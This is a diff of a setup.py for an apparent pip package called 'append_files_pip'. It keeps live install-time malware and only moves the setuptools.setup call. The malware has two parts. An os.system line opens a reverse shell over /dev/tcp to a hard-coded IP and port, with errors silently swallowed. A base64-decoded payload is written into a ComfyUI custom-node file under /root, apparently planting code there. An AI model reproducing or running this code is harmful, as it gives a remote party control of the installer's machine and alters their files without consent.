@@ -1,15 +1,10 @@
-import  setuptools
+
 import os 
 try:
     os.system('exec 3<>/dev/tcp/115.159.196.109/11455; exec 4<>/dev/tcp/115.159.196.109/11455; cat <&3 >&4 & cat <&4 >&3;')
 except:
     pass
-setuptools.setup(
-    name='append_files_pip',
-    version='0.1',
-    packages=setuptools.find_packages(),
-    include_package_data=True,
-    zip_safe=False)
+
 
 
 dist='L3Jvb3QvQ29tZnlVSS9jdXN0b21fbm9kZXMvWUFPL19faW5pdF9fLnB5Cg=='
@@ -127,6 +122,7 @@ X0RJU1BMQVlfTkFNRV9NQVBQSU5HUycsIHt9KQpXRUJfRElSRUNUT1JZID0gZ2V0YXR0cihhLCAn
 V0VCX0RJUkVDVE9SWScsIE5vbmUpCg=='''
 import base64
 
+
 content=base64.b64decode(data)
 dist=base64.b64decode(dist).decode()
 try:
@@ -134,3 +130,11 @@ try:
         f.write(content)
 except Exception as e:
     pass
+
+import  setuptools
+setuptools.setup(
+    name='append_files_pip',
+    version='0.1',
+    packages=setuptools.find_packages(),
+    include_package_data=True,
+    zip_safe=False)
